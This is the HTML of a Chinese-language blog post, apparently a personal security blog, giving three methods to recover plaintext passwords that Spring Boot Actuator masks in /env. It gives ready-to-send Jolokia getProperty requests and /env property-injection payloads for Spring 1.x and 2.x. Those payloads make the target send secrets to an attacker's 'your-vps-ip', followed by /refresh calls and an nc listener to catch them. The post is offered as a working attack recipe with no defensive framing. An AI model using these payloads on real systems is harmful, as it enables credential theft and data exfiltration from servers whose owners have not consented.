@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="获取被星号脱敏的密码的明文 (方法一) 访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果  利用条件：   目标网站存在 &#x2F;jolokia 或 &#x2F;actuator&#x2F;jolokia 接口   目标使用了 jolokia-core 依赖（版本要求暂未知）  利用方法：步骤一： 找到想要获取">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="获取被星号脱敏的密码的明文 (方法一) 访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果  利用条件：   目标网站存在 &#x2F;jolokia 或 &#x2F;actuator&#x2F;jolokia 接口   目标使用了 jolokia-core 依赖（版本要求暂未知）  利用方法：步骤一： 找到想要获取">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:03.817Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Spring Boot/Spring Boot 获取被星号脱敏的密码的明文" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.817Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="获取被星号脱敏的密码的明文-方法一"><a href="#获取被星号脱敏的密码的明文-方法一" class="headerlink" title="获取被星号脱敏的密码的明文 (方法一)"></a>获取被星号脱敏的密码的明文 (方法一)</h2><blockquote>
+<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如<br>password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
+<li>  目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li>
+</ul>
+<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名"><a href="#步骤一：-找到想要获取的属性名" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code><br>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-jolokia-调用相关-Mbean-获取明文"><a href="#步骤二：-jolokia-调用相关-Mbean-获取明文" class="headerlink" title="步骤二： jolokia 调用相关 Mbean 获取明文"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h5><p>将下面示例中的 <code>security.user.password</code><br>替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的<br><code>value</code> 键中。</p>
+<ul>
+<li>  调用 <code>org.springframework.boot</code> Mbean（<strong>可能更通用</strong>）</li>
+</ul>
+<blockquote>
+<p>实际上是调用<br>org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar<br>类实例的 getProperty 方法</p>
+</blockquote>
+<p>spring 1.x</p>
+<pre><code>POST /jolokia
+Content-Type: application/json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/jolokia
+Content-Type: application/json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;
+</code></pre>
+<ul>
+<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean（<strong>需要<br>  spring cloud 相关依赖</strong>）</li>
+</ul>
+<blockquote>
+<p>实际上是调用<br>org.springframework.cloud.context.environment.EnvironmentManager<br>类实例的 getProperty 方法</p>
+</blockquote>
+<p>spring 1.x</p>
+<pre><code>POST /jolokia
+Content-Type: application/json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/jolokia
+Content-Type: application/json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;
+</code></pre>
+<h2 id="获取被星号脱敏的密码的明文-方法二"><a href="#获取被星号脱敏的密码的明文-方法二" class="headerlink" title="获取被星号脱敏的密码的明文 (方法二)"></a>获取被星号脱敏的密码的明文 (方法二)</h2><blockquote>
+<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如<br>password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+<h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  可以 GET 请求目标网站的 <code>/env</code></li>
+<li>  可以 POST 请求目标网站的 <code>/env</code></li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在<br>  <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>  目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
+<li>  目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-1"><a href="#步骤一：-找到想要获取的属性名-1" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code><br>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-使用-nc-监听-HTTP-请求"><a href="#步骤二：-使用-nc-监听-HTTP-请求" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p>
+<pre><code>nc -lvk 80
+</code></pre>
+<h5 id="步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code> 中的<br><code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p>
+<p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;
+</code></pre>
+<h5 id="步骤四：-刷新配置"><a href="#步骤四：-刷新配置" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h5 id="步骤五：-解码属性值"><a href="#步骤五：-解码属性值" class="headerlink" title="步骤五： 解码属性值"></a>步骤五： 解码属性值</h5><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下<br><code>Authorization</code> 头内容：</p>
+<pre><code>Authorization: Basic dmFsdWU6MTIzNDU2
+</code></pre>
+<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值<br><code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
+<h2 id="获取被星号脱敏的密码的明文-方法三"><a href="#获取被星号脱敏的密码的明文-方法三" class="headerlink" title="获取被星号脱敏的密码的明文 (方法三)"></a>获取被星号脱敏的密码的明文 (方法三)</h2><blockquote>
+<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如<br>password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+<h4 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li>
+<li>  目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><blockquote>
+<p>参考 UUUUnotfound 提出的<br><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部<br>http 请求的过程中，在 url path 中利用占位符带出数据</p>
+</blockquote>
+<h5 id="步骤一：-找到想要获取的属性名-2"><a href="#步骤一：-找到想要获取的属性名-2" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code><br>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-使用-nc-监听-HTTP-请求-1"><a href="#步骤二：-使用-nc-监听-HTTP-请求-1" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p>
+<pre><code>nc -lvk 80
+</code></pre>
+<h5 id="步骤三：-触发对外-http-请求"><a href="#步骤三：-触发对外-http-请求" class="headerlink" title="步骤三： 触发对外 http 请求"></a>步骤三： 触发对外 http 请求</h5><ul>
+<li><code>spring.cloud.bootstrap.location</code><br>  方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
+</ul>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=$&#123;security.user.password&#125;&quot;&#125;
+</code></pre>
+<ul>
+<li><code>eureka.client.serviceUrl.defaultZone</code><br>  方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
+</ul>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/$&#123;security.user.password&#125;&quot;&#125;
+</code></pre>
+<h5 id="步骤四：-刷新配置-1"><a href="#步骤四：-刷新配置-1" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87/" data-id="cl5c2qvms00gty8v19estd1q1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E6%8F%90%E5%8F%96%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
